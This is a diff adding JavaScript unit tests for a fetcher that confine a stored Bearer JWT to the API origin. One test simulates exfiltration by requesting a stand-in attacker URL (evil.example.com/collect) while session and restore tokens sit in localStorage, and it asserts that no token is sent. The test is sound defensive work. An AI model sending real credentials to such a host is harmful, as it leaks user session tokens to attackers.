@@ -149,6 +149,66 @@ describe('fetcher', () => {
     expect(calledUrl).toContain('https://external-api.example.com');
   });
 
+  // ── P2-278 (run #176, Hunt R4-1): Bearer token origin allowlist ─────────
+  // The stored JWT must only ride requests that target the API origin.
+  // A compromised/buggy absolute-URL call site must not be able to exfiltrate
+  // the token cross-origin.
+
+  it('attaches the Bearer token to a relative (API-origin) path', async () => {
+    localStorage.setItem('koralink_token', 'session-jwt-xyz');
+    vi.stubGlobal(
+      'fetch',
+      vi.fn().mockResolvedValue({
+        ok: true,
+        json: () => Promise.resolve({}),
+      })
+    );
+    await fetcher('/wallet');
+    const [, options] = vi.mocked(fetch).mock.calls[0];
+    expect((options?.headers as Record<string, string>)?.Authorization).toBe(
+      'Bearer session-jwt-xyz'
+    );
+    localStorage.removeItem('koralink_token');
+  });
+
+  it('attaches the Bearer token to a same-origin ABSOLUTE URL', async () => {
+    localStorage.setItem('koralink_token', 'session-jwt-xyz');
+    vi.stubGlobal(
+      'fetch',
+      vi.fn().mockResolvedValue({
+        ok: true,
+        json: () => Promise.resolve({}),
+      })
+    );
+    await fetcher('https://api.test.local/wallet');
+    const [, options] = vi.mocked(fetch).mock.calls[0];
+    expect((options?.headers as Record<string, string>)?.Authorization).toBe(
+      'Bearer session-jwt-xyz'
+    );
+    localStorage.removeItem('koralink_token');
+  });
+
+  it('NEVER attaches the Bearer token to a foreign-origin absolute URL', async () => {
+    localStorage.setItem('koralink_token', 'session-jwt-xyz');
+    localStorage.setItem('koralink_pdpl_restore_token', 'restore-jwt-abc');
+    vi.stubGlobal(
+      'fetch',
+      vi.fn().mockResolvedValue({
+        ok: true,
+        json: () => Promise.resolve([]),
+      })
+    );
+    await fetcher('https://evil.example.com/collect');
+    const [, options] = vi.mocked(fetch).mock.calls[0];
+    const headers = options?.headers as Record<string, string>;
+    expect(headers?.Authorization).toBeUndefined();
+    // credentials: 'include' stays unconditional — cookie policy is the
+    // browser's job, not the fetcher's (P2-240 prod contract untouched).
+    expect(options?.credentials).toBe('include');
+    localStorage.removeItem('koralink_token');
+    localStorage.removeItem('koralink_pdpl_restore_token');
+  });
+
   it('passes custom headers alongside defaults', async () => {
     vi.stubGlobal(
       'fetch',
